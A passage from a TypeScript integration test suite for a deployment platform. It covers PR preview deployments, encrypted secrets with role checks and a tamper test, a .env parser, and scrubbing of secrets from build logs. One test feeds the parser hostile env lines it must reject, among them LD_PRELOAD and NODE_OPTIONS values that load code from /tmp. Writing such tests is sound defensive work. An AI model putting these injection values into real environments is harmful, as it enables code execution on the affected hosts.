      'X-GitHub-Event': 'pull_request',
      'X-GitHub-Delivery': 'delivery-pr42-sync',
      'X-Hub-Signature-256': computeGitHubWebhookSignature(rawPrSync),
    },
  });
  assert.strictEqual(prSyncRes.status, 202);
  const prSyncData = prSyncRes.json<{ deploymentId: string; inPlaceUpdate: boolean }>();
  assert.strictEqual(prSyncData.inPlaceUpdate, true);
  assert.strictEqual(
    prSyncData.deploymentId,
    prOpenData.deploymentId,
    'Synchronize event must reuse existing PR preview deployment in-place'
  );

  await waitUntilSettled(prSyncData.deploymentId);
  const prCommentAfterSync = (
    await invokeApp(testApp, 'GET', '/api/webhooks/pr-comments/acme-cloud/commercial-saas-web/42')
  ).json<{ comment: { commentId: string; status: string; markdownBody: string } }>().comment;
  assert.strictEqual(
    prCommentAfterSync.commentId,
    prCommentAfterOpen.commentId,
    'PR bot must update the single existing comment ID rather than spamming new comments'
  );
  assert.strictEqual(prCommentAfterSync.status, 'LIVE');
  assert.ok(prCommentAfterSync.markdownBody.includes('2222222'));

  // Close/Merge PR #42 -> must automatically tear down preview cloud resources & release Route 53 hostname
  const prClosedPayload = {
    ...prOpenedPayload,
    action: 'closed',
  };
  const rawPrClosed = JSON.stringify(prClosedPayload);
  const prClosedRes = await invokeApp(testApp, 'POST', '/api/webhooks/github', {
    rawBody: rawPrClosed,
    headers: {
      'X-GitHub-Event': 'pull_request',
      'X-GitHub-Delivery': 'delivery-pr42-closed',
      'X-Hub-Signature-256': computeGitHubWebhookSignature(rawPrClosed),
    },
  });
  assert.strictEqual(prClosedRes.status, 200);
  assert.strictEqual(prClosedRes.json<{ cleanedUp: boolean }>().cleanedUp, true);
  assert.strictEqual(store.get(prOpenData.deploymentId)?.status, 'DELETED');
  assert.strictEqual(
    store.isHostnameAvailable('pr-42-commercial-saas-web.maas-fam.com'),
    true,
    'Closed PR preview hostname must be released immediately'
  );
  console.log('   ✓ DM-908 (TC-908-01 PR Preview Open -> In-Place Sync -> Auto-Destroy & DNS Release) passed.');

  // ==========================================================================
  // DM-913 (#13): AES-256-GCM Secrets Vault, .env Parser & Audit Log Redaction
  // ==========================================================================
  console.log('18. Testing DM-913 (AES-256-GCM Encrypted Secrets, .env Parser & [REDACTED] Audit Log Scrubber)...');

  const rawProdApiKey = 'dm_test_prod_secret_val_99887766';
  const rawPreviewApiKey = 'dm_test_preview_secret_val_112233';
  const rawStripeSecret = 'dm_test_billing_secret_val_987654321';

  // DEVELOPER can save preview secrets (201), blocked from production secrets (403)
  const devPreviewSecRes = await invokeApp(
    testApp,
    'POST',
    `/api/projects/${saasProjectId}/secrets`,
    {
      headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
      body: {
        environment: 'preview',
        secrets: { OPENAI_API_KEY: rawPreviewApiKey },
      },
    }
  );
  assert.strictEqual(devPreviewSecRes.status, 201);

  const devProdSecBlocked = await invokeApp(
    testApp,
    'POST',
    `/api/projects/${saasProjectId}/secrets`,
    {
      headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
      body: {
        environment: 'production',
        secrets: { OPENAI_API_KEY: rawProdApiKey },
      },
    }
  );
  assert.strictEqual(devProdSecBlocked.status, 403);

  // ADMIN saves production secrets via AES-256-GCM vault
  const adminProdSecRes = await invokeApp(
    testApp,
    'POST',
    `/api/projects/${saasProjectId}/secrets`,
    {
      headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
      body: {
        environment: 'production',
        secrets: {
          OPENAI_API_KEY: rawProdApiKey,
          STRIPE_SECRET_KEY: rawStripeSecret,
        },
      },
    }
  );
  assert.strictEqual(adminProdSecRes.status, 201);

  // TC-913-01a: GET /api/projects/:id/secrets returns ONLY masked previews — zero plaintext or ciphertext
  const listSecretsRes = await invokeApp(
    testApp,
    'GET',
    `/api/projects/${saasProjectId}/secrets`,
    {
      headers: { Authorization: `Bearer ${devToken}`, 'X-Org-Id': orgAId },
    }
  );
  assert.strictEqual(listSecretsRes.status, 200);
  assert.strictEqual(listSecretsRes.text.includes(rawProdApiKey), false);
  assert.strictEqual(listSecretsRes.text.includes(rawPreviewApiKey), false);
  assert.strictEqual(listSecretsRes.text.includes('ciphertext'), false);
  assert.ok(listSecretsRes.text.includes('••••'), 'Expected masked preview in GET /secrets');

  // Verify raw database file on disk contains ZERO plaintext secret values
  const rawDbDiskContent = fs.readFileSync(tmpDbPath, 'utf8');
  assert.strictEqual(
    rawDbDiskContent.includes(rawProdApiKey),
    false,
    'Plaintext production secret must NEVER be written to disk'
  );
  assert.strictEqual(
    rawDbDiskContent.includes(rawStripeSecret),
    false,
    'Plaintext Stripe secret must NEVER be written to disk'
  );

  // TC-913-01b: Environment isolation + GCM authentication tag tamper rejection
  const resolvedProd = secretsVault.resolveDecryptedSecretsForDeploy(saasProjectId, 'production', store);
  const resolvedPreview = secretsVault.resolveDecryptedSecretsForDeploy(saasProjectId, 'preview', store);
  assert.strictEqual(resolvedProd.OPENAI_API_KEY, rawProdApiKey);
  assert.strictEqual(resolvedPreview.OPENAI_API_KEY, rawPreviewApiKey);

  const encryptedRecord = store.listEncryptedSecrets(saasProjectId, 'production')[0];
  const flippedCiphertext =
    (encryptedRecord.ciphertext[0] === 'A' ? 'B' : 'A') + encryptedRecord.ciphertext.slice(1);
  assert.throws(
    () => secretsVault.decryptRecord({ ...encryptedRecord, ciphertext: flippedCiphertext }),
    /integrity verification failed/i,
    'Tampered AES-256-GCM ciphertext must throw integrity error'
  );
  assert.throws(
    () => secretsVault.decryptRecord({ ...encryptedRecord, environment: 'preview' }),
    /integrity verification failed/i,
    'Cross-environment AAD mismatch must throw integrity error'
  );

  // DM-913 AC2: 15-line multi-line .env parser + blocked dangerous keys (AWS_*, LD_PRELOAD, NODE_OPTIONS)
  const sampleDotEnv15Lines = [
    '# Database & AI Configuration',
    'DATABASE_URL="postgres://app:pass@db.internal:5432/prod"',
    '',
    '# Stripe & Public Keys',
    'export NEXT_PUBLIC_APP_ENV=production',
    "REDIS_CACHE_URL='redis://cache.internal:6379'",
    'WEBHOOK_SIGNING_SECRET=whsec_1234567890abcdef # inline comment stripped',
    '# Feature Flags',
    'ENABLE_AI_DIAGNOSTICS=true',
    'SENTRY_DSN=https://public@sentry.example.com/1',
    'SMTP_HOST=smtp.postmarkapp.com',
    'SMTP_PORT=587',
    'LOG_LEVEL=info',
    '# End of .env',
    'APP_VERSION=2.4.0',
  ].join('\n');

  const parseOkRes = await invokeApp(testApp, 'POST', '/api/secrets/parse-dotenv', {
    body: { dotEnvText: sampleDotEnv15Lines },
  });
  assert.strictEqual(parseOkRes.status, 200);
  const parsedBody = parseOkRes.json<{
    count: number;
    entries: Array<{ key: string; value: string }>;
  }>();
  assert.strictEqual(parsedBody.count, 10);
  assert.strictEqual(
    parsedBody.entries.find((e) => e.key === 'WEBHOOK_SIGNING_SECRET')?.value,
    'whsec_1234567890abcdef'
  );

  for (const blockedEnv of [
    'AWS_ACCESS_KEY_ID=EXAMPLE_BLOCKED_AWS_KEY',
    'LD_PRELOAD=/tmp/malicious.so',
    'NODE_OPTIONS=--require=/tmp/hook.js',
  ]) {
    const blockedRes = await invokeApp(testApp, 'POST', '/api/secrets/parse-dotenv', {
      body: { dotEnvText: blockedEnv },
    });
    assert.strictEqual(
      blockedRes.status,
      400,
      `Blocked env line "${blockedEnv}" must be rejected with 400`
    );
  }

  // TC-913-02: Audit Log Secret Scrubber — accidental secret printed during build is scrubbed to [REDACTED]
  const secretDeployRes = await invokeApp(testApp, 'POST', '/api/deploy', {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
    body: {
      repoUrl: 'https://github.com/acme-cloud/commercial-saas-web',
      projectId: saasProjectId,
      environment: 'production',
    },
  });
  assert.strictEqual(secretDeployRes.status, 202);
  const secretDepId = secretDeployRes.json<{ deploymentId: string }>().deploymentId;
  await waitUntilSettled(secretDepId);

  store.addLog(
    secretDepId,
    'BUILDING',
    'INFO',
    `Build script echo STRIPE_SECRET_KEY=${rawStripeSecret} and OPENAI=${rawProdApiKey}`
  );

  const pollSecretDep = await invokeApp(testApp, 'GET', `/api/deploy/${secretDepId}`, {
    headers: { Authorization: `Bearer ${adminToken}`, 'X-Org-Id': orgAId },
  });
  assert.strictEqual(pollSecretDep.status, 200);
  assert.strictEqual(
    pollSecretDep.text.includes(rawStripeSecret),
    false,
    'TC-913-02 FAILED: Raw Stripe secret leaked in GET /api/deploy/:id auditLogs!'
  );
  assert.strictEqual(
    pollSecretDep.text.includes(rawProdApiKey),
    false,
    'TC-913-02 FAILED: Raw OpenAI secret leaked in GET /api/deploy/:id auditLogs!'
  );
  assert.ok(
    pollSecretDep.text.includes(
      'Build script echo STRIPE_SECRET_KEY=[REDACTED] and OPENAI=[REDACTED]'
    ),
    'Expected accidental secret values in auditLogs to be replaced with [REDACTED]'
  );

  if (fs.existsSync(tmpDbPath)) {
    fs.unlinkSync(tmpDbPath);
  }

  console.log('   ✓ DM-913 (TC-913-01 AES-256-GCM + Tamper Check, AC2 .env Parser & TC-913-02 [REDACTED] Log Scrubber) passed.\n');
  console.log('ALL PHASE 9 · SPRINT 2 TESTS (DM-906, DM-907, DM-908, DM-913) PASSED!');
}

async function runAllTests(): Promise<void> {
  await runPhase1To3Tests();
  await runPhase9Sprint1Tests();
  await runPhase9Sprint2Tests();
}

runAllTests().catch((err) => {
  console.error('Test suite failed:', err);
  process.exit(1);
});
